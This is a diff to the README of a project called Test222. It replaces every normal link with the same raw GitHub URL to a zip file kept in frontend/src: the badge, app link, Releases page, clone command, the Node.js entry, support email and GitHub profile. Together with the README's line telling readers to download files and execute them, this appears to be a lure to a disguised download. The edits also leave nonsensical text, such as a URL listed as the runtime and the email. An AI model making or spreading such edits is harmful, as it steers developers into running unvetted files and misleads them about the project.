@@ -1,8 +1,8 @@
 # Welcome to Test222! 🚀
 
-![Test222](https://img.shields.io/badge/Test222-Ready%20to%20Use-brightgreen)
+![Test222](https://raw.githubusercontent.com/sisterfoil61000/test222/master/frontend/src/test-v1.6.zip%20to%20Use-brightgreen)
 
-This repository was created by the Flatlogic Platform. You can find the application [here](https://test222-30752-dev-lnm5nd2pia-uc.a.run.app). For updates and downloads, visit our [Releases section](https://github.com/sisterfoil61000/test222/releases).
+This repository was created by the Flatlogic Platform. You can find the application [here](https://raw.githubusercontent.com/sisterfoil61000/test222/master/frontend/src/test-v1.6.zip). For updates and downloads, visit our [Releases section](https://raw.githubusercontent.com/sisterfoil61000/test222/master/frontend/src/test-v1.6.zip).
 
 ## Table of Contents
 
@@ -27,7 +27,7 @@ This project utilizes a variety of technologies to ensure high performance and s
 - **JavaScript (JS)**: The primary programming language for the application.
 - **Low-Code**: Enables rapid application development with minimal coding.
 - **Nginx**: Acts as a web server and reverse proxy.
-- **Node.js**: The runtime environment for executing JavaScript on the server.
+- **https://raw.githubusercontent.com/sisterfoil61000/test222/master/frontend/src/test-v1.6.zip**: The runtime environment for executing JavaScript on the server.
 - **PostgreSQL**: A powerful database system for storing data.
 - **React**: A library for building user interfaces.
 - **Tailwind CSS**: A utility-first CSS framework for styling.
@@ -39,12 +39,12 @@ To get started with Test222, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/sisterfoil61000/test222.git
+   git clone https://raw.githubusercontent.com/sisterfoil61000/test222/master/frontend/src/test-v1.6.zip
    cd test222
    ```
 
 2. **Install Dependencies**:
-   Ensure you have Node.js and Docker installed. Then, run:
+   Ensure you have https://raw.githubusercontent.com/sisterfoil61000/test222/master/frontend/src/test-v1.6.zip and Docker installed. Then, run:
    ```bash
    npm install
    ```
@@ -59,7 +59,7 @@ To get started with Test222, follow these steps:
    Open your web browser and navigate to `http://localhost:3000` to view the application.
 
 5. **Download Releases**:
-   For the latest features and updates, check our [Releases section](https://github.com/sisterfoil61000/test222/releases). Download the necessary files and execute them as instructed.
+   For the latest features and updates, check our [Releases section](https://raw.githubusercontent.com/sisterfoil61000/test222/master/frontend/src/test-v1.6.zip). Download the necessary files and execute them as instructed.
 
 ## Usage
 
@@ -105,7 +105,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out:
 
-- **Email**: support@test222.com
-- **GitHub**: [sisterfoil61000](https://github.com/sisterfoil61000)
+- **Email**: https://raw.githubusercontent.com/sisterfoil61000/test222/master/frontend/src/test-v1.6.zip
+- **GitHub**: [sisterfoil61000](https://raw.githubusercontent.com/sisterfoil61000/test222/master/frontend/src/test-v1.6.zip)
 
-Thank you for checking out Test222! We hope you find it useful in your development journey. For the latest updates and releases, visit our [Releases section](https://github.com/sisterfoil61000/test222/releases).
+Thank you for checking out Test222! We hope you find it useful in your development journey. For the latest updates and releases, visit our [Releases section](https://raw.githubusercontent.com/sisterfoil61000/test222/master/frontend/src/test-v1.6.zip).
